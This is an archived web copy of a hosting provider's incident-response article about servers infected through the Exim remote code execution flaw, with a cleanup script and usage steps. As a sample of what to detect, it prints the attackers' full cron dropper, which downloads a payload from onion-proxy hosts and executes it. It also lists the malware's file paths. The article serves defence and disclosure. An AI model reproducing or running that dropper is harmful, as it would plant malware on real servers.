<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>The first wave affected by the Exim vulnerability. Treatment script</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Vulnerability with RCE in Exim has already made a lot of noise, and pretty much patted the nerves of system administrators around the world. 

 In the...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>The first wave affected by the Exim vulnerability. Treatment script</h1><div class="post__text post__text-html js-mediator-article">  <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-10149">Vulnerability with RCE in Exim</a> has already made a lot of noise, and pretty much patted the nerves of system administrators around the world. <br><br>  In the wake of massive infections (many of our clients use Exim as their mail server), I quickly set up a script to automate the solution of the problem.  The script is far from ideal and is full of non-optimal code, but this is a quick combat solution in order not to perform the same type of actions on hundreds or even thousands of servers. <br><br>  Works on servers running Centos, RHEL, Debian, Ubuntu with the Exim mail server installed. <a name="habracut"></a>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h2>  How to understand that the server is hacked? </h2><br>  Check running processes with top. <br>  On infected servers, there is a 100% load created by the [kthrotlds] process.  Also in the cron scheduler is added a task with limited editing rights. <br><br><h2>  Alert section </h2><br>  All the incidents of infection we have encountered were of the same type, the second and third waves may differ from them - they may have to modify the script.  At the time of infection, tasks in cron are lost irretrievably and they must be returned by hand.  The "hacks from the shoulder" script - fearlessly updates Exim to patched versions, in the case of Centos 6, even from the test repository.  The malware instance is in memory, so the server <b>must</b> be restarted immediately after cleaning the crowns. <br><br>  <b>Important: the</b> vulnerability allows you to execute code from under the root, which does not provide any guarantees of absolute healing.  Having root access to the server, you can hide almost anything on this server, so that it will be almost impossible to find it.  Guaranteed to completely cure the server can only be a complete reinstallation, but it is not always possible.  If there is no possibility to reinstall the server, and the symptoms coincide with those described - you can try to quickly fill the holes with this script. <br><br>  Using the script, you do this at your own risk: we tested the script on a number of servers, however, there are always risks of incompatible software versions or configuration conflicts. <br>  Also, our script allows to cure only one of the possible implementations of the infection - it is possible that there are already other ways to exploit vulnerabilities that have not come to our attention. <br><br><h2>  What does the script do? </h2><br><br>  1. Updates Exim, reinstalls curl. <br>  2. Checks for infection on the server. <br><br><div class="spoiler">  <b class="spoiler_title">The script analyzes the task scheduler for suspicious inclusions.</b> <div class="spoiler_text">  For example, such: <br><br><pre><code class="plaintext hljs">*/11 * * * * root tbin=$(command -v passwd); bpath=$(dirname "${tbin}"); curl="curl"; if [ $(curl --version 2&gt;/dev/null|grep "curl "|wc -l) -eq 0 ]; then curl="echo"; if [ "${bpath}" != "" ]; then for f in ${bpath}*; do strings $f 2&gt;/dev/null|grep -q "CURLOPT_VERBOSE" &amp;&amp; curl="$f" &amp;&amp; break; done; fi; fi; wget="wget"; if [ $(wget --version 2&gt;/dev/null|grep "wgetrc "|wc -l) -eq 0 ]; then wget="echo"; if [ "${bpath}" != "" ]; then for f in ${bpath}*; do strings $f 2&gt;/dev/null|grep -q "to &lt;bug-wget@gnu.org&gt;" &amp;&amp; wget="$f" &amp;&amp; break; done; fi; fi; if [ $(cat /etc/hosts|grep -i ".onion."|wc -l) -ne 0 ]; then echo "127.0.0.1 localhost" &gt; /etc/hosts &gt;/dev/null 2&gt;&amp;1; fi; (${curl} -fsSLk --retry 2 --connect-timeout 22 --max-time 75 https://an7kmd2wp4xo7hpr.tor2web.su/src/ldm -o /.cache/.ntp||${curl} -fsSLk --retry 2 --connect-timeout 22 --max-time 75 https://an7kmd2wp4xo7hpr.tor2web.io/src/ldm -o /.cache/.ntp||${curl} -fsSLk --retry 2 --connect-timeout 22 --max-time 75 https://an7kmd2wp4xo7hpr.onion.sh/src/ldm -o /.cache/.ntp||${wget} --quiet --tries=2 --wait=5 --no-check-certificate --connect-timeout=22 --timeout=75 https://an7kmd2wp4xo7hpr.tor2web.su/src/ldm -O /.cache/.ntp||${wget} --quiet --tries=2 --wait=5 --no-check-certificate --connect-timeout=22 --timeout=75 https://an7kmd2wp4xo7hpr.tor2web.io/src/ldm -O /.cache/.ntp||${wget} --quiet --tries=2 --wait=5 --no-check-certificate --connect-timeout=22 --timeout=75 https://an7kmd2wp4xo7hpr.onion.sh/src/ldm -O /.cache/.ntp) &amp;&amp; chmod +x /.cache/.ntp &amp;&amp; /bin/sh /.cache/.ntp</code> </pre> <br></div></div><br>  2a  If there are traces of a viral script in the / etc folder, do the following <br><br><ul><li>  stops cron </li><li>  kills a process started by a viral script </li><li>  kills processes curl wget sh four times (run by a virus on a schedule) </li><li>  cleans the mail queue from all letters (it is difficult to separate infected messages from harmless ones, so <b>you have to delete the entire queue</b> ) </li><li>  allows deleting files where fragments of a malicious script are located: <br><pre> <code class="plaintext hljs">/etc/cron.daily/cronlog /etc/cron.d/root /etc/cron.d/.cronbus /etc/cron.hourly/cronlog /etc/cron.monthly/cronlog /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.d/root /etc/crontab /root/.cache/ /root/.cache/a /usr/local/bin/nptd /root/.cache/.kswapd /usr/bin/\[kthrotlds\] /root/.ssh/authorized_keys /.cache/* /.cache/.sysud /.cache/.a /.cache/.favicon.ico /.cache/.kswapd /.cache/.ntp</code> </pre></li><li>  deletes these files </li><li>  deletes the autostart job in /etc/rc.local </li><li>  removes an attacker's key from allowed ssh keys </li><li>  runs cron </li><li>  and immediately restarts the server </li></ul><br>  2b.  If there are no traces of infection, the script quits. <br><br><h2>  Clarifications </h2><br>  All tasks cron scheduler virus removes.  Therefore, after restarting the server, they need to be reconfigured or restored from backup. <br><br>  curl is also infected with a virus, so it is reinstalled. <br><br>  A reboot (the script performs it automatically after disinfection) is mandatory - otherwise the malware is stored in the server‚Äôs memory and replicates itself every 30 seconds even after the removal of infected files. <br><br><h2>  How to use? </h2><br>  Traditionally: before starting, make sure that you have an up-to-date backup copy of the server data. <br><br><h3>  To run the script: </h3><br>  Connect to the server using ssh as root.  You can also use the Shell client in the ISPmanager - Tools panel. <br><br>  In the terminal, enter the command: <br><br><pre> <code class="plaintext hljs">wget https://lechillka.firstvds.ru/exim_rce_fixer.sh &amp;&amp; chmod +x exim_rce_fixer.sh &amp;&amp; ./exim_rce_fixer.sh</code> </pre> <br>  Wait for the script to complete and reboot the server. <br><br>  After the reboot, check the operation of the server and the sites / applications hosted on it, reconfigure or restore tasks to cron from the backup. <br><br><h2>  And finally </h2><br>  In fact, the script is a <b>temporary solution</b> to restore the server to work, for guaranteed prevention the best solution is to switch to a new server with the version of the operating system that does not already contain vulnerabilities. <br><br>  All recommendations for finalizing / reworking the script are welcome.  If you experience another symptom of infection, please show it.  Cooperation at the moments of mass infections significantly reduces the time needed to eliminate these infections. <br><br>  Good luck! <br><br>  UPD1: <a href="">Added on github</a> . <br>  <a href="">Filled there the source of the script Malvari, which managed to get from the infected server</a> . <br>  UPD2: for Centos 6 came release 4.92 in EPEL, now in all versions of the script is placed from the main repositories.  Initially, the script downloaded 4.92 for Centos 6 of EPEL / testing. </div><p>Source: <a href="https://habr.com/ru/post/455636/">https://habr.com/ru/post/455636/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../455626/index.html">Wallarm Offzone2019 HackQuest</a></li>
<li><a href="../45563/index.html">Internet business vs crisis. Who will win?</a></li>
<li><a href="../455630/index.html">Digital events in Moscow from 11 to 16 June</a></li>
<li><a href="../455632/index.html">Attention! Dangerous bug in C ++ implementation of std :: map :: merge and std :: set :: merge in Visual Studio 2017</a></li>
<li><a href="../455634/index.html">Mathematics and the game "Set"</a></li>
<li><a href="../455638/index.html">Alan Kay did not invent objects</a></li>
<li><a href="../45564/index.html">Apple spends more money on advertising than Microsoft</a></li>
<li><a href="../455640/index.html">Marvin Minsky "The Emotion Machine": Chapter 4. "How We Recognize Consciousness"</a></li>
<li><a href="../455642/index.html">The architecture of the service of distributed message queues in Yandex. Oblak</a></li>
<li><a href="../455646/index.html">Security Week 24: factory backdoors on Android smartphones</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>